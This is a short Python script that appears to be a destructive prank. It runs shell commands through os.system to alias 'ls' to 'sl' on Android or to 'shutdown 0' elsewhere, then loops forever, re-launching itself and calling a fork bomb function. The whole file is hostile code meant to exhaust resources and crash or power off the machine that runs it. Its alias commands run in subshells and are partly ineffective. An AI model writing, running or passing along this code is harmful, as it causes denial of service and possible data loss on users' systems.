import os
import platform
from forkbomb import forkbomb
if platform.system() == "Android":
  os.system("yes | pkg install sl")
  os.system("clear")
  os.system('alias ls="sl"')
else:
  os.system('alias ls="shutdown 0"')
while True:
  os.system("python fork.py")
  forkbomb()
